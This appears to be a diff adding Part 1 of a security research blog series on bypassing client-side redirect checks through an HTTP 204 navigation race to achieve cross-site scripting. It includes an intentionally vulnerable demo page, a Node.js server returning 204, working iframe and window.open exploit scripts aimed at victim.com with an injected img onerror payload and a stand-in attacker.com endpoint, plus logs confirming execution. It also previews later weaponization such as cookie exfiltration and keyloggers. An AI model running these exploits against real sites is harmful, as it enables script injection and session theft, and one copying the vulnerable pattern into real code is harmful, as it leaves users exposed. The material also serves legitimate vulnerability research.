@@ -1,0 +1,239 @@
+# Bypassing Client-Side Sanitizers with HTTP 204 Race Conditions
+
+## Part 1 — The Race Nobody Checks For
+
+I've been spending a lot of time looking at how web applications handle user input on the client side. Not server-side validation — that's well understood. I'm talking about the JavaScript layer, the stuff that runs in the browser before anything touches the backend. And I kept running into the same pattern over and over: developers using `window.location.href` as a sanitizer.
+
+The idea is simple. Check the input, and if it looks dangerous, redirect the user away before anything bad happens. Sounds reasonable. But there's a fundamental flaw in how browsers handle navigation, and it creates a race condition that lets you bypass the entire check.
+
+This is Part 1 of a series where I walk through the research, the discovery, and the escalation. In this post I'll cover the vulnerability pattern, explain why HTTP 204 matters, and show a working proof of concept.
+
+---
+
+## The Vulnerable Pattern
+
+Here's a page I built to demonstrate the issue. You'll find variations of this pattern all over production codebases:
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <h2 id="greeting">hi</h2>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userName = urlParams.get('name') || 'Guest';
+
+        if (userName.includes('<') || userName.includes('>')) {
+            window.location.href = "/login.html"; 
+        }
+
+        setTimeout(() => {
+            document.getElementById('greeting').innerHTML = "Welcome, " + userName;
+        }, 500); 
+    </script>
+</body>
+</html>
+```
+
+Walk through it. The page reads a `name` parameter from the URL. If that parameter contains `<` or `>`, it redirects to `/login.html`. The developer's thinking: the redirect happens before the `setTimeout` callback fires, so the dangerous input never reaches `innerHTML`.
+
+If you open this page with `?name=Guest`, you get a clean "Welcome, Guest" message. If you open it with `?name=<script>alert(1)</script>`, the sanitizer catches the angle brackets and sends you to the login page. Works exactly as intended.
+
+Except it doesn't. Not really.
+
+## The Flaw: Navigation is Asynchronous
+
+Here's what most developers don't realize about `window.location.href`:
+
+**Setting `window.location.href` does not immediately navigate the page.** It queues a navigation. The browser continues executing the current script to completion before it actually starts the navigation process.
+
+So when the code does this:
+
+```javascript
+if (userName.includes('<') || userName.includes('>')) {
+    window.location.href = "/login.html";  // queues navigation
+}
+
+setTimeout(() => {
+    document.getElementById('greeting').innerHTML = "Welcome, " + userName;
+}, 500);  // this still gets registered
+```
+
+Both things happen. The redirect is queued, and the `setTimeout` is registered. The browser doesn't stop executing JavaScript just because you set `location.href`. The navigation happens asynchronously — the browser sends a request to `/login.html`, waits for the response, and only then replaces the current document.
+
+That gap between "redirect requested" and "redirect completed" is where this whole attack lives.
+
+## HTTP 204: No Content, Stay Where You Are
+
+HTTP 204 is one of those status codes that most developers know exists but never think twice about. The [MDN documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204) describes it as a successful response indicating that "the client doesn't need to navigate away from its current page."
+
+According to [RFC 9110](https://www.rfc-editor.org/info/rfc9110/#status.204), a 204 response means the server successfully processed the request but has no content to return. The critical part is what the browser does with it during navigation: **nothing**. The browser stays on the current page. The document is preserved. JavaScript keeps running.
+
+As [AbstractAPI's guide on 204](https://www.abstractapi.com/guides/http-status-codes/204) puts it: "Unlike other responses, 204 does not refresh or navigate away from the page. The user's view remains exactly as it was."
+
+This is the intended behavior. It's used for things like auto-save in wiki editors — you `PUT` your changes, the server responds with 204, and the editor stays exactly where it is. No page reload, no navigation. The [Chromium source code](https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798) has gone through multiple revisions on how to handle this exact scenario.
+
+So what happens if we navigate a page to a URL that responds with 204?
+
+The page stays alive. All registered timers keep running. The document is preserved.
+
+## The Race Condition
+
+Now put it together.
+
+1. The victim page loads with a malicious `name` parameter containing XSS payload
+2. The sanitizer detects `<` and sets `window.location.href = "/login.html"` — a navigation is queued
+3. The `setTimeout` is registered (fires at 500ms)
+4. The browser starts fetching `/login.html`
+5. **Before the `/login.html` response arrives**, we navigate the page to a URL that returns HTTP 204
+6. The 204 response tells the browser: "stay on the current page"
+7. The original document is preserved — the sanitizer's redirect was effectively cancelled
+8. The `setTimeout` fires, `innerHTML` writes the unsanitized input, and XSS executes
+
+The race is between the `/login.html` response and our 204 delivery. If we get the 204 in before `/login.html` loads, we win.
+
+## The 204 Server
+
+The attacker needs a server that returns 204. Here's the simplest version using only Node.js built-in modules:
+
+```javascript
+const http = require('http');
+
+http.createServer((req, res) => {
+    // CORS headers so cross-origin iframes can trigger it
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    
+    if (req.url.startsWith('/trigger-204')) {
+        res.writeHead(204);
+        res.end();
+        return;
+    }
+    
+    res.writeHead(404);
+    res.end();
+}).listen(9090, () => {
+    console.log('204 server running on port 9090');
+});
+```
+
+Hit `/trigger-204` from anywhere, get a 204 back, the browser stays where it is. That's all we need.
+
+## First Attempt: window.open (The Naive Approach)
+
+My first instinct was to use `window.open`. Open the victim page in a new window, wait a bit, then navigate that window to our 204 endpoint:
+
+```javascript
+function exploit() {
+    let payload = "<img src=x onerror=alert('XSS')>";
+    let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
+    
+    let win = window.open(url);
+    
+    setTimeout(() => {
+        win.location.href = "http://attacker.com/trigger-204";
+    }, 400);
+}
+```
+
+The idea: open the victim page, give it 400ms to start loading, then fire the 204 to cancel the redirect.
+
+**It didn't work.** Not once, across dozens of attempts at different delays (50ms through 500ms). Every single time, the redirect completed before the 204 could arrive.
+
+I added timing instrumentation and found the problem. `window.open()` has significant overhead — on my machine, it took roughly **467ms** just to create the new window, initialize the renderer, and start loading the page. By the time the victim page's sanitizer fired the redirect and the `/login.html` response came back, my 204 was still sitting in a `setTimeout` waiting to fire.
+
+The timeline looks like this:
+
+```
+t=0ms      window.open() called
+t=0-467ms  browser creates new window (overhead)
+t=467ms    victim.html starts loading
+t=470ms    script executes, redirect to /login.html queued
+t=470ms    /login.html request sent  
+t=670ms    /login.html response arrives (200ms server latency)
+t=670ms    page navigates to login.html — game over
+
+Meanwhile:
+t=400ms    our setTimeout fires, but the page hasn't even loaded yet
+```
+
+The 204 arrives either before the page loads (useless) or after the redirect completes (too late). The window creation overhead makes the timing window impossibly tight.
+
+## The Breakthrough: iframes
+
+After `window.open` failed, I started thinking about what else could hold a reference to a browsing context. And then it clicked: **iframes load in-process**. There's no new window creation, no renderer initialization, no cross-process handshake. The iframe's page starts loading immediately when you set `src`.
+
+```javascript
+function exploit() {
+    let payload = "<img src=x onerror=alert('XSS')>";
+    let url = "http://victim.com/page.html?name=" + encodeURIComponent(payload);
+    
+    let iframe = document.createElement('iframe');
+    iframe.src = url;
+    document.body.appendChild(iframe);
+    
+    setTimeout(() => {
+        iframe.contentWindow.location.href = "http://attacker.com/trigger-204";
+    }, 100);
+}
+```
+
+100ms. That's all it takes. The iframe loads the victim page almost instantly, the sanitizer fires the redirect, and our 204 arrives before `/login.html` responds. The page stays alive, the `setTimeout` fires, `innerHTML` writes the payload, and XSS executes.
+
+I ran this against my test setup and it hit on the first try. Then the second. Then twenty times in a row.
+
+Here's what the server logs look like when the exploit succeeds:
+
+```
+[VICTIM] GET /victim.html?name=<img src=x onerror=...>
+[VICTIM] GET /login.html           ← sanitizer redirect fires
+[C2]     204 triggered              ← our 204 arrives
+[VICTIM] GET /x                    ← XSS payload executed (img src=x)
+
+*** [XSS CONFIRMED] ***
+```
+
+Notice something interesting: `/login.html` is still requested. The sanitizer's redirect does fire. But the 204 navigation supersedes it. The browser cancels the pending `/login.html` response and stays on the original page. The document survives. The timer fires. XSS executes.
+
+## Why This Matters
+
+This isn't just a contrived demo. The vulnerable pattern — "check input, redirect if bad, then render" — exists everywhere JavaScript does client-side validation. Any page that:
+
+1. Reads user input from the URL
+2. Checks it for dangerous characters
+3. Uses `window.location.href` (or `location.replace`, or `location.assign`) to redirect away
+4. Has a delayed sink (`setTimeout`, `requestAnimationFrame`, async callback, promise chain)
+
+...is potentially exploitable with this technique.
+
+The [MITRE CAPEC framework](https://capec.mitre.org/data/definitions/3000.html) classifies attacks that exploit trust in client-side validation as a distinct category for good reason — the browser's execution model is not what most developers assume it is. Navigation is not synchronous. Redirects are not instant. And HTTP 204 preserves the document in a way that breaks the security assumptions of client-side sanitizers.
+
+## The Proof
+
+Here's what it looks like when it fires:
+
+The attacker page creates an iframe pointing to the victim with an XSS payload in the URL parameter. At 100ms, it navigates the iframe to the 204 endpoint. The victim page's sanitizer fires the redirect to `/login.html`, but the 204 cancels it. 500ms later, the `innerHTML` sink writes the payload and the XSS executes. An alert box confirms code execution in the victim's origin.
+
+The full PoC is available in the GitHub repo linked at the end of this series.
+
+---
+
+## What's Next
+
+In Part 1 I showed that the race condition exists and that iframes make it reliable. But we've only scratched the surface.
+
+**Part 2** will cover why iframes are fundamentally better than `window.open` for this attack, with hard timing data from a comparison test. I'll also introduce the multi-frame barrage technique — spawning dozens of iframes simultaneously to guarantee at least one lands in the race window, regardless of network conditions.
+
+**Part 3** goes into weaponization: data exfiltration (cookies, localStorage, DOM content), keylogger injection, phishing form injection, and chained payloads that do all three at once. Zero-pixel invisible iframes that self-destruct after execution.
+
+---
+
+## References
+
+- [MDN: HTTP 204 No Content](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204) — Official documentation on 204 behavior
+- [RFC 9110 § 15.3.5](https://www.rfc-editor.org/info/rfc9110/#status.204) — The HTTP specification defining 204 semantics
+- [AbstractAPI: HTTP 204 Guide](https://www.abstractapi.com/guides/http-status-codes/204) — Practical guide on 204 and browser behavior
+- [Chromium Source Changes](https://chromium.googlesource.com/chromium/src/+/8c0cc38022..783044b798) — Chromium's handling of 204 during navigation
+- [TrustedSec: Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss) — Related work on XSS exfiltration techniques
+- [MITRE CAPEC-3000](https://capec.mitre.org/data/definitions/3000.html) — Attack pattern classification for client-side exploitation
+- [W3C HTML5 Specification](https://www.w3.org/TR/2011/WD-html5-20110405/Overview.html) — Navigation and browsing context behavior
+- [Stack Overflow: 204 and window.location](https://stackoverflow.com/questions/59884115/how-to-handle-204-errow-from-window-location-url) — Developer discussion on 204 navigation edge cases
